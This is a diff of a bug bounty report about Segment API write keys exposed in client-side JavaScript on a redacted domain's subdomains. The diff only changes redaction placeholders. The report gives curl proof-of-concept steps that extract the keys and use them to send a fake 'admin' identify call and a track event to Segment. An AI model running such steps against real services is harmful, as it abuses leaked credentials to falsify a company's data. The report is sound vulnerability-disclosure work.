@@ -14,8 +14,8 @@
 Multiple Segment API Write Keys are exposed in client-side JavaScript code across multiple subdomains of `[REDACTED-DOMAIN]`, allowing attackers to inject fake analytics data, create fake user profiles, and pollute business metrics.
 
 **Keys Exposed:**
-- **Key 1:** `[REDACTED-KEY-1]` (found on `voting.[REDACTED-DOMAIN]`)
-- **Key 2:** `[REDACTED-KEY-2]` (found on `issuer.[REDACTED-DOMAIN]`)
+- **Key 1:** `REDACTED_KEY_1` (found on `voting.[REDACTED-DOMAIN]`)
+- **Key 2:** `REDACTED_KEY_2` (found on `issuer.[REDACTED-DOMAIN]`)
 
 ---
 
@@ -23,8 +23,8 @@ Multiple Segment API Write Keys are exposed in client-side JavaScript code acros
 
 **Step 1: Extract keys from source code**
 ```bash
-curl -s "https://voting.[REDACTED-DOMAIN]/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: [REDACTED-EMAIL]" | grep -o '[REDACTED-KEY-1]'
-curl -s "https://issuer.[REDACTED-DOMAIN]/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: [REDACTED-EMAIL]" | grep -o '[REDACTED-KEY-2]'
+curl -s "https://voting.[REDACTED-DOMAIN]/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: [REDACTED-EMAIL]" | grep -o 'REDACTED_KEY_1'
+curl -s "https://issuer.[REDACTED-DOMAIN]/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: [REDACTED-EMAIL]" | grep -o 'REDACTED_KEY_2'
 ```
 
 Both commands return the respective API keys, confirming they are present in the source code.
@@ -32,7 +32,7 @@ Both commands return the respective API keys, confirming they are present in the
 **Step 2: Test Key #1 with Segment Identify Endpoint**
 ```bash
 curl -X POST "https://api.segment.io/v1/identify" \
--u "[REDACTED-KEY-1]:" \
+-u "REDACTED_KEY_1:" \
 -H "Content-Type: application/json" \
 -d '{"userId":"REDACTED-TEST","traits":{"email":"test@test.com","role":"admin"}}'
 ```
@@ -41,7 +41,7 @@ curl -X POST "https://api.segment.io/v1/identify" \
 **Step 3: Test Key #2 with Segment Track Endpoint**
 ```bash
 curl -X POST "https://api.segment.io/v1/track" \
--u "[REDACTED-KEY-2]:" \
+-u "REDACTED_KEY_2:" \
 -H "Content-Type: application/json" \
 -d '{"event":"Test Event","userId":"REDACTED-TEST","properties":{"test":true}}'
 ```
